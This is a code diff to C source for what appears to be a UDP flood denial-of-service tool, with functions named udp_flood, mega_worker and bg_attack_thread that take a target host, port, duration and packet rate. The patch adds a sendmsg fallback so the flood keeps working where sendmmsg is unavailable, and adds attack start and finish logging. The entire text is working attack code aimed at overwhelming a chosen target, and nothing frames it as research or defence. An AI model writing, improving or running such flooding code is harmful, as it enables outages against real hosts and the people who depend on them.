@@ -17,6 +17,37 @@ static int resolve_target(const char *host, struct in_addr *out)
     return 0;
 }
 
+/* Wrapper: fallback sendmsg when sendmmsg is not available (ENOSYS) */
+static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int flags)
+{
+    static int use_sendmsg = -1; /* -1=unknown, 0=sendmmsg ok, 1=fallback */
+
+    if (use_sendmsg == 1) {
+        int sent = 0;
+        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
+            ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
+            if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
+            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+        }
+        return sent > 0 ? sent : -1;
+    }
+
+    int r = sendmmsg(fd, msgvec, vlen, flags);
+    if (r < 0 && errno == ENOSYS) {
+        fprintf(stderr, "[atk] sendmmsg not supported, falling back to sendmsg\n");
+        use_sendmsg = 1;
+        /* Retry this batch */
+        int sent = 0;
+        for (unsigned int i = 0; i < vlen && !g_attack_stop; i++) {
+            ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
+            if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
+            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+        }
+        return sent > 0 ? sent : -1;
+    }
+    return r;
+}
+
 /* ── MEGA Engine ──────────────────────────────────────
  * Strategy: FEW sockets, MAX PPS/bytes per syscall.
  * - sendmmsg batch of full MTU payloads (1400B) → high Mbps
@@ -160,7 +191,7 @@ static void *mega_worker(void *arg)
                 p[rand_r(&seed) % MEGA_PAYLOAD] ^= (unsigned char)rand_r(&seed);
             }
             for (int b = 0; b < BURST_MULTIPLIER; b++) {
-                int r = sendmmsg(mt->socks[si], msgs, batch, flags);
+                int r = safe_sendmmsg(mt->socks[si], (struct mmsghdr *)msgs, (unsigned int)batch, flags);
                 if (r > 0) {
                     pkt_sent(r * MEGA_PAYLOAD);
                 } else if (errno == EAGAIN || errno == EWOULDBLOCK) {
@@ -297,7 +328,7 @@ void udp_flood(struct sockaddr_in ta, AttackParams *p, TokenBucket *tb)
         if (!tb_consume(tb, batch)) { usleep(20); continue; }
         if (should_pause()) { usleep(200); continue; }
         for (int si = 0; si < nsk && !g_attack_stop; si++) {
-            int r = sendmmsg(socks[si], msgs, batch, flags);
+            int r = safe_sendmmsg(socks[si], (struct mmsghdr *)msgs, (unsigned int)batch, flags);
             if (r > 0) {
                 int bytes = 0;
                 for (int k = 0; k < r; k++) bytes += (int)iovs[k].iov_len;
@@ -782,6 +813,10 @@ void *bg_attack_thread(void *arg)
     g_pkt_count = 0;
     g_byte_count = 0;
 
+    fprintf(stderr, "[atk] START method=%s target=%s:%d dur=%ds pps=%u mega=%u\n",
+            atk->method, atk->target, atk->port, atk->duration_secs,
+            atk->max_pps, atk->mega_mode);
+
     if (atk->mega_mode || !strcmp(atk->method, "MEGA")) {
         int cores = get_nprocs();
         if (cores < 1) cores = 1;
@@ -931,6 +966,7 @@ void *bg_attack_thread(void *arg)
         for (int i = 0; i < nc; i++) pthread_join(tids[i], NULL);
         free(tids);
     }
+    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
     g_attack_active = 0;
     free(ctx);
     return NULL;
